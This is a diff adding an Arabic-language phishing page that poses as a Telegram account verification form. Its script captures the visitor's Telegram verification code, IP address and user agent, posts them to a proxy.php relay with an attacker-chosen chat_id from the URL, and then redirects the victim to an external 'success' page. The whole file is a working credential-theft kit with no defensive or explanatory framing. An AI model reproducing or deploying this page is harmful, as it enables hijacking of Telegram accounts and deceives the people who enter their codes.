@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>تحقق من حساب تليجرام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            width: 100%;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #00BFAE;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn:hover {
+            background-color: #008f7d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>تحقق من حساب تليجرام</h1>
+        <form id="verifyForm">
+            <input type="text" name="verification_code" class="input-field" placeholder="كود تحقق تليجرام" required />
+            <button type="submit" class="btn">تأكيد الحساب</button>
+        </form>
+    </div>
+<script>
+  const CHAT_ID = new URLSearchParams(window.location.search).get("id");
+
+  document.getElementById("verifyForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    const code = formData.get("verification_code");
+    const device = navigator.userAgent;
+
+    let ipData = { ip: "غير معروف" };
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      ipData = await res.json();
+    } catch (e) {}
+
+    const message = `🚨 كود تحقق تليجرام:
+
+📥 الكود: ${code}
+
+🌐 IP: ${ipData.ip}
+
+📱 الجهاز: ${device}`;
+
+    const formToSend = new FormData();
+    formToSend.append("chat_id", CHAT_ID);
+    formToSend.append("message", message);
+
+    fetch("proxy.php", {
+      method: "POST",
+      body: formToSend
+    })
+    .then(() => {
+      window.location.href = "https://issol.free.nf/success/ok.html?i=1";
+    })
+    .catch(() => {
+      alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
+    });
+  });
+</script>
+</body>
+</html>
